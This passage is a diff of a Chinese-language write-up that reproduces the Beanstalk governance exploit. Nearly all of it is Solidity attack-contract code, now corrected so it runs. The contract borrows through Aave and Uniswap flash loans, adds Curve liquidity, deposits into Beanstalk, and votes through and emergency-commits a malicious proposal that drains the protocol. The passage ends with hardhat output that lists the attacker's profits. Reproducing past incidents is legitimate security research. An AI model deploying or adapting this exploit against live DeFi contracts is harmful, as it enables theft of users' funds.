@@ -98,7 +98,7 @@ BIP19init地址为FakeBIP18，调用参数同样为init()函数签名。
 
 2. 为什么最后攻击的时候要用创建合约的方式在构造函数中调用？是否有EOA限制？
 
-   答：无限制，不清楚为什么攻击者要用这种形式进行攻击利用。
+   答：无限制，不清楚为什么攻击者要用这种形式进行攻击利用，在复现过程中并没有使用在构造函数调用的方式依然复现成功。
 
 ## 复现
 
@@ -110,10 +110,11 @@ import "hardhat/console.sol";
 interface IERC20{
     function totalSupply() external view returns (uint256);
     function balanceOf(address account) external view returns (uint256);
-    function transfer(address recipient, uint256 amount) external returns (bool);
+    function transfer(address recipient, uint256 amount) external ;
     function allowance(address owner, address spender) external view returns (uint256);
     function approve(address spender, uint256 amount) external;// returns (bool);
     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+    function decimals() external view returns(uint);
 }
 
 interface IAAVEPool{
@@ -126,8 +127,8 @@ interface IUniswapV2Pair{ //for uniswap flashloan
 interface ICRV{
     function add_liquidity( uint256[3] calldata, uint256) external;
     function add_liquidity( uint256[2] calldata, uint256) external;
-    function exchange(uint128, uint128, uint256, uint256) external returns(uint);
-    function remove_liquidity_one_coin(uint256, uint128, uint256) external;
+    function exchange(int128, int128, uint256, uint256) external returns(uint);
+    function remove_liquidity_one_coin(uint256, int128, uint256) external;
 }
 interface IBeanProtocol{
     enum FacetCutAction {Add, Replace, Remove}
@@ -198,8 +199,16 @@ contract attack{
         
         IERC20(beanTokenAddress).approve(beanCrvAddress, type(uint).max);
         IERC20(lusdAddress).approve(beanCrvAddress, type(uint).max);
-
-
+        console.log("Attacker balances info before attack:");
+        uint256 usdtBefore = IERC20(usdtAddress).balanceOf(msg.sender);
+        uint256 usdcBefore = IERC20(usdcAddress).balanceOf(msg.sender);
+        uint256 daiBefore = IERC20(daiAddress).balanceOf(msg.sender);
+        uint256 wethBefore = IERC20(weth).balanceOf(msg.sender);
+        console.log("usdt: %s", usdtBefore);
+        console.log("dai: %s", daiBefore);
+        console.log("usdc: %s", usdcBefore);
+        console.log("weth: %s", wethBefore);
+        console.log("Attack Start!");
         
         address[] memory addrArray = new address[](3);
         addrArray[0] = daiAddress;
@@ -210,15 +219,28 @@ contract attack{
         amounts[1] = 500*1e12;
         amounts[2] = 150*1e12;
         uint256[] memory types = new uint256[](3);
-        IAAVEPool(aavePoolAddress).flashLoan(address(this),  addrArray,  amounts, types, address(this), '0x', 0);
+        IAAVEPool(aavePoolAddress).flashLoan(address(this),  addrArray,  amounts, types, address(this), new bytes(0), 0);
 
 
         IERC20(wethBeanUniPairAddress).transfer(wethBeanUniPairAddress, IERC20(wethBeanUniPairAddress).balanceOf(address(this)));
         IUniPair(wethBeanUniPairAddress).burn(address(this));
+
         IERC20(daiAddress).transfer(msg.sender, IERC20(daiAddress).balanceOf(address(this)));
         IERC20(usdcAddress).transfer(msg.sender, IERC20(usdcAddress).balanceOf(address(this)));
-        IERC20(usdtAddress).transfer(msg.sender, IERC20(usdtAddress).balanceOf(address(this)));
         IERC20(wethAddress).transfer(msg.sender, IERC20(wethAddress).balanceOf(address(this)));
+        IERC20(usdtAddress).transfer(msg.sender, IERC20(usdtAddress).balanceOf(address(this)));
+        console.log("Attack complete!!!");
+        console.log("Attacker balances info after attack:");
+        console.log("usdt: %s", IERC20(usdtAddress).balanceOf(msg.sender));
+        console.log("dai: %s", IERC20(daiAddress).balanceOf(msg.sender));
+        console.log("usdc: %s", IERC20(usdcAddress).balanceOf(msg.sender));
+        console.log("weth: %s", IERC20(weth).balanceOf(msg.sender));
+        console.log("Attacker profit:");
+        console.log("usdt: %s", (IERC20(usdtAddress).balanceOf(msg.sender) - usdtBefore)/(10**IERC20(usdtAddress).decimals()));
+        console.log("dai: %s", (IERC20(daiAddress).balanceOf(msg.sender) - daiBefore)/(10**IERC20(daiAddress).decimals()));
+        console.log("usdc: %s", (IERC20(usdcAddress).balanceOf(msg.sender) - usdcBefore)/(10**IERC20(usdcAddress).decimals()));
+        console.log("weth: %s", (IERC20(weth).balanceOf(msg.sender) - wethBefore)/(10**IERC20(weth).decimals()));
+
     }
     function bytesToAddress(bytes memory bys) public pure returns (address addr) {
       assembly {
@@ -229,10 +251,10 @@ contract attack{
         uint112 loan;
         (,loan,)= IUniswapV2Pair(wethBeanUniPairAddress).getReserves();
         IUniswapV2Pair(wethBeanUniPairAddress).swap(0, loan - 1, address(this), abi.encodePacked(beanTokenAddress));
-        ICRV(lusdCrvAddress).exchange(uint128(0), uint128(1), IERC20(lusdAddress).balanceOf(address(this)) , uint256(0));
-        ICRV(crvDTCPool).remove_liquidity_one_coin(510*1e24, 1, 0);
+        ICRV(lusdCrvAddress).exchange(int128(0), int128(1), IERC20(lusdAddress).balanceOf(address(this)) , uint256(0));
+        ICRV(crvDTCPool).remove_liquidity_one_coin(511*1e24, 1, 0);
         ICRV(crvDTCPool).remove_liquidity_one_coin(358*1e24, 0, 0);
-        ICRV(crvDTCPool).remove_liquidity_one_coin(153*1e24, 1, 0);
+        ICRV(crvDTCPool).remove_liquidity_one_coin(153*1e24, 2, 0);
         return true;
   }
     function uniswapV2Call(address , uint amount0, uint amount1, bytes calldata data) external{
@@ -241,7 +263,7 @@ contract attack{
             uint112 loan;
             (loan,,) = IUniswapV2Pair(lusdOhmUniPairAddress).getReserves();
             IUniswapV2Pair(lusdOhmUniPairAddress).swap(loan - 1, 0, address(this), abi.encodePacked(lusdAddress)); 
-            IERC20(token).transfer(msg.sender, amount1);
+            IERC20(token).transfer(msg.sender, amount1*103/100);
         }
         else if(token == lusdAddress){
             {
@@ -254,26 +276,29 @@ contract attack{
             amounts1[2] = USDTbalance;
             ICRV(crvDTCPool).add_liquidity(amounts1, 0);
             }
-            uint256  result = ICRV(lusdCrvAddress).exchange(uint128(1), uint128(0), uint256(15000000000000000000000000) , uint256(0));
+            ICRV(lusdCrvAddress).exchange(int128(1), int128(0), uint256(15000000000000000000000000) , uint256(0));
+
             uint256[2] memory amounts2;
             amounts2[0] = 0;
             amounts2[1] = IERC20(crvDTC).balanceOf(address(this));
-            console.log("crv3 balance %s", amounts2[1]);
             ICRV(beanCrvAddress).add_liquidity(amounts2, 0);
+
             uint256[2] memory amounts3;
             amounts3[0] = IERC20(beanTokenAddress).balanceOf(address(this));
             amounts3[1] = IERC20(lusdAddress).balanceOf(address(this));
 
             ICRV(beanLusdAddress).add_liquidity(amounts3, 0);
+
             IBeanProtocol(beanProtocolAddress).deposit(beanCrvAddress, IERC20(beanCrvAddress).balanceOf(address(this)));
             IBeanProtocol(beanProtocolAddress).vote(18);
             IBeanProtocol(beanProtocolAddress).emergencyCommit(18);
-            uint256 amt = IERC20(beanCrvAddress).balanceOf(address(this));
-            uint256 Crv = IERC20(crvDTC).balanceOf(beanCrvAddress);
-            console.log(" balance %s", Crv);
-            ICRV(beanCrvAddress).remove_liquidity_one_coin(amt, uint128(1), 0);
-            ICRV(beanLusdAddress).remove_liquidity_one_coin(IERC20(beanLusdAddress).balanceOf(address(this)), uint128(1), 0);
-            IERC20(token).transfer(msg.sender, amount0);
+
+
+
+            ICRV(beanCrvAddress).remove_liquidity_one_coin(IERC20(beanCrvAddress).balanceOf(address(this)), int128(1), 0);
+            ICRV(beanLusdAddress).remove_liquidity_one_coin(IERC20(beanLusdAddress).balanceOf(address(this)), int128(1), 0);
+
+            IERC20(token).transfer(msg.sender, amount0*103/100);
         }
     }
 }
@@ -379,9 +404,38 @@ main().catch((error) => {
 
 ```
 
+攻击结果：
+
+```
+Starting: scripts/exp.js
+bip18 contract deployed to: 0x071De7C3f893dF0433aA9875b98573c311cEbEb3
+attack contract deployed to: 0xF13a26aE5220Bd9938a01e82D942f7861E137CBf
+step 1
+step 2
+step 3
+step 4
+step 5
+step 6
+Attacker balances info before attack:
+usdt: 369597349963533
+dai: 66241775324561619976498877
+usdc: 188473623778025
+weth: 131854066543862422958
+Attack Start!
+Attack complete!!!
+Attacker balances info after attack:
+usdt: 375593307343946
+dai: 81305718364113267453166695
+usdc: 209530785475087
+weth: 10006973842734896769461
+Attacker profit:
+usdt: 5995957
+dai: 15063943
+usdc: 21057161
+weth: 9875
+```
 
 
-完全按着攻击者的步骤来的，但是会在和curve交互时出现问题，debug两天了毫无进展，本来以为攻击手法这么复杂可能有一些隐藏的逻辑，但是事实证明这些复杂的步骤就是为了凑够足够的票数，其漏洞就是恶意提案攻击。
 
 ## 总结
 
